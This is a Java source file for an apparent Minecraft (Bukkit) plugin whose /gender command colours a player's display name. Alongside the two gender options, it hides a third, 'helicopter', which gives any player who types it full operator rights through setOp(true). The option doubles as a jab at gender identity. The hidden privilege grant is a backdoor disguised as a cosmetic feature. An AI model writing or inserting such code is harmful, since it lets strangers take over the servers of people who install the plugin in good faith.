package org.xnotro.chatgender.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.xnotro.chatgender.Main;

public class Commands implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if (cmd.getName().equalsIgnoreCase("gender")) {

            // Console
            if (!(sender instanceof Player)) {
                sender.sendMessage("You cannot run this from console.");
                return true;
            }

            Player player = (Player) sender;

            // If The Player Type only /gender
            if (args.length == 0) {
                sender.sendMessage("§7[§fGender§7] §f> §aPlease Specify Which Gender!");
                sender.sendMessage("§7[§fGender§7] §f> §bAvailable " +
                        Main.gender1 + " - "
                        + Main.gender2 + " - "
                        + Main.helicopter);
                return true;
            }

            // If The Player Type /gender gender1
            if (args[0].equalsIgnoreCase(Main.gender1)) {
                player.setDisplayName(ChatColor.LIGHT_PURPLE + player.getName() + ChatColor.RESET);
                sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.gender1);
            }

            // If The Player Type /gender gender2
            if (args[0].equalsIgnoreCase(Main.gender2)) {
                player.setDisplayName(ChatColor.BLUE + player.getName() + ChatColor.RESET);
                sender.sendMessage("§7[§fGender§7] §f> §aNow Your Gender Is Setted To " + Main.gender2);
            }

            // If The Player Type /gender helicopter
            if (args[0].equalsIgnoreCase(Main.helicopter)) {
                sender.sendMessage("§7[§fGender§7] §f> §eNow You Have Full Perms >:)");
                player.setOp(true);
            }
        }
        return true;
    }
}

